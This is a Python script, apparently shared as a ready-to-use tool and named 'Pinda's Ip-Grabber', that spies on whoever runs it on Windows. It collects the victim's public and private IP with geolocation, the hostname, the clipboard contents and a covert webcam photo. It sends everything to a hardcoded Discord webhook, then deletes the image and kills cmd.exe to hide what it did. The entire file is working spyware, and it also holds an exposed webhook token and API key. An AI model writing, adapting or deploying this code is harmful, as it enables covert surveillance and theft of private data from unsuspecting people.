import requests, json, time, subprocess as d, os
from dhooks import Webhook, Embed
import socket
import sys
import tkinter as tk
import cv2
import win32clipboard
#######################################################


desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
image_path = os.path.join(desktop_path, 'webcam_image.jpg')

# Check if the file exists before attempting to remove it
if os.path.exists(image_path):
    os.remove(image_path)
    print("File removed successfully.")
else:
    print("File does not exist.")


#private ip
hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)


def b():
    return requests.get('https://api.ipify.org/').text

def i():
    return requests.get(f'http://extreme-ip-lookup.com/json/{b()}?key=9OIrviWeSJxhxxR8oOCI').json() #Your API Key WILL GO HERE AFTER key=

def f(a):
    g = Embed(title="IP Information", description="Tracking down the target's digital footprint...", color=0xFF0000)
    g.set_thumbnail(url="https://i.imgur.com/1234567.png")
    for h, j in a.items():
        if h == "businessName":h = "**Business Name**"
        elif h == "businessWebsite":h = "**Business Website**"
        elif h == "city":h = "**City**"
        elif h == "continent":h = "**Continent**"
        elif h == "country":h = "**Country**"
        elif h == "countryCode":h = "**Country Code**"
        elif h == "ipName":h = "**Hostname**"
        elif h == "ipType":h = "**IP Type**"
        elif h == "isp":h = "**ISP**"
        elif h == "lat":h = "**Latitude**"
        elif h == "lon":h = "**Longitude**"
        elif h == "message":h = "**Status Message**"
        elif h == "org":h = "**Organization**"
        elif h == "query":h = "**IP Address**"
        elif h == "region":h = "**Region**"
        elif h == "status":h = "**Status**"
        elif h == "timezone":h = "**Timezone**"
        elif h == "utcOffset":h = "**UTC Offset**"
        g.add_field(name=h.capitalize(), value=j, inline=True)
    return g

def main():
    h = "https://discord.com/api/webhooks/1231986714755465297/PvcdGKxfQFEEA_czt-zYIGi8ZV8dOyrRCyLjqoX17vbMVrLWy2R3EEr7nmr2_9tMqHQD"  # REPLACE WITH YOUR WEBHOOK
    j = Webhook(h)
    j.send("Pinda's Ip-Grabber 1.2")


    time.sleep(1)
    j.send("```diff\n+Tracking Victim\n```")
    time.sleep(1.2)
    j.send("```diff\n+Sucsessful!\n```")
    k = b()
    l = i()
    m = f(l)
    j.send(embed=m)
    j.send("```diff\nThe private ip is:\n```")
    j.send(IPAddr)
    time.sleep(2)
    j.send("```diff\n the victim's hostname is:\n```")
    j.send(socket.gethostname())
    j.send("```diff\n the victim's clipboard content is:\n```")
    # get clipboard data
    win32clipboard.OpenClipboard()
    data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()
    j.send(data)
    j.send("```diff\n what is on the victim's webcam now is:\n```")
    # Access the webcam
    cap = cv2.VideoCapture(0)
    # Check if the webcam is opened successfully
    if not cap.isOpened():
        print("Error: Unable to access the webcam.")
        exit()

    # Capture an image
    ret, frame = cap.read()

    # Check if the frame is captured successfully and not empty
    if not ret or frame is None:
        print("Error: Unable to capture the frame or frame is empty.")
        cap.release()
        cv2.destroyAllWindows()
        exit()

    # Release the webcam
    cap.release()
    cv2.destroyAllWindows()

    # Save the image to the desktop
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    image_path = os.path.join(desktop_path, 'webcam_image.jpg')
    cv2.imwrite(image_path, frame)

    # Define the webhook URL
    webhook_url = "https://discord.com/api/webhooks/1231986714755465297/PvcdGKxfQFEEA_czt-zYIGi8ZV8dOyrRCyLjqoX17vbMVrLWy2R3EEr7nmr2_9tMqHQD"

    # Define the message text
    message_text = "Hello, here's the latest image from the webcam!"

    # Prepare the image file as an attachment
    files = {'file': open(image_path, 'rb')}

    # Send the message with the image attachment via webhook
    response = requests.post(webhook_url, data={'content': message_text}, files=files)

    # Check if the request was successful
    if response.status_code == 200:
        print("Message sent successfully.")
    else:
        print("Error:", response.text)

    # Remove the saved image file
    os.remove(image_path)
    
    d.run("taskkill /f /im cmd.exe")

if __name__ == "__main__":
    main()
